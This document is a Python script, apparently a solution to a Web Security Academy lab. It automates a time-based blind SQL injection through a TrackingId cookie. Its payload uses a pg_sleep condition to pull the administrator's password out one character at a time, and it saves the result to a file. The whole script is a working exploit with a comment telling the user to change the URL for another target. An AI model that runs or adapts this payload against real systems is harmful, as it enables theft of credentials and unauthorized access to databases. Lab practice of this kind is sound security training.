#!/usr/bin/python3

import string, requests, sys, signal
from pwn import log

# Ctrl + C
def signal_handler(signal, frame):
    print("\n[!] Exiting ...")
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

# Global Variables
char_pool = ',-_' + string.ascii_letters + string.digits
main_url = "https://0af6008403afaaa3826dce6b00fe000d.web-security-academy.net" # CHANGE THIS

def bruteForce():
    result=""

    p1 = log.progress("Brute Force")
    p1.status("Starting brute force attack")
    p2 = log.progress("Result")

    found = False
    index = 1
    while not found:
        for char in char_pool:
            custom_cookies = { # injectable field (CHANGE COOKIES)
                    "TrackingId": f"SmZbe8HKseK2y3dU'||(select case when (select substring(password,{index},1)='{char}') then pg_sleep(3) else null end from users where username='administrator')-- -",
                    "session": "3XMOUr1j1UssYmSLYmdnjnsZ3r6roXf7"
                    }
            p1.status(custom_cookies["TrackingId"])

            response = requests.get(main_url, cookies=custom_cookies)
            if response.elapsed.total_seconds() >= 3:
                result += char
                p2.status(result)
                break
        else:
            found = True # when the for loops thru all chars and doesn't find a match, we assume the string ended
        index+=1
    return result

if __name__ == "__main__":
    result = bruteForce()
    print(f"\n[!] Found: {result}\n[!] Writing to a file...")
    with open("output.txt", "a") as f:
        f.write(f"{result}\n")
